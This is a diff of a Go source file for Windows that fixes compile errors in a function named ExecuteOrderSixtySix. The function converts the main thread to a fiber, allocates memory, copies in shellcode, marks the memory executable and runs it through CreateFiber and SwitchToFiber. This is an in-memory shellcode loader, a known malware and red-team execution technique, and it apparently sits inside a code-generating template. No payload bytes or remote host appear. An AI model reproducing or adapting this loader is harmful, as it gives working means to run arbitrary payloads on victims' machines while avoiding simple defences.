@@ -12,7 +12,6 @@ package main
 
 import (
 	"os"
-	"fmt"
 	"unsafe"
     "syscall"
 )
@@ -29,18 +28,18 @@ var (
     kernel32            = syscall.MustLoadDLL("kernel32.dll")
     ntdll               = syscall.MustLoadDLL("ntdll.dll")
 
-	VirtualAlloc := kernel32.MustFindProc("VirtualAlloc")
-	VirtualProtect := kernel32.MustFindProc("VirtualProtect")
-	RtlCopyMemory := ntdll.MustFindProc("RtlCopyMemory")
-	ConvertThreadToFiber := kernel32.MustFindProc("ConvertThreadToFiber")
-	CreateFiber := kernel32.MustFindProc("CreateFiber")
-	SwitchToFiber := kernel32.MustFindProc("SwitchToFiber")
+	VirtualAlloc            = kernel32.MustFindProc("VirtualAlloc")
+	VirtualProtect          = kernel32.MustFindProc("VirtualProtect")
+	ConvertThreadToFiber    = kernel32.MustFindProc("ConvertThreadToFiber")
+	CreateFiber             = kernel32.MustFindProc("CreateFiber")
+	SwitchToFiber           = kernel32.MustFindProc("SwitchToFiber")
+    RtlCopyMemory           = ntdll.MustFindProc("RtlCopyMemory")
 )
 
 func ExecuteOrderSixtySix(shellcode []byte) {
 
     /* convert main thread to fiber */
-	fiberAddr, _, errConvertFiber := ConvertThreadToFiber.Call()
+	fiberAddr, _, _ := ConvertThreadToFiber.Call()
     if fiberAddr == 0 {
         os.Exit(1)
     }
@@ -59,8 +58,9 @@ func ExecuteOrderSixtySix(shellcode []byte) {
 	_, _, _ = VirtualProtect.Call(addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
 
     /* call CreateFiber & switch to the fiber to execute the payload */
-	fiber, _, _ = CreateFiber.Call(0, addr, 0)
+    fiber, _, _ := CreateFiber.Call(0, addr, 0)
 	_, _, _ = SwitchToFiber.Call(fiber)
 
+}
     `)
 }
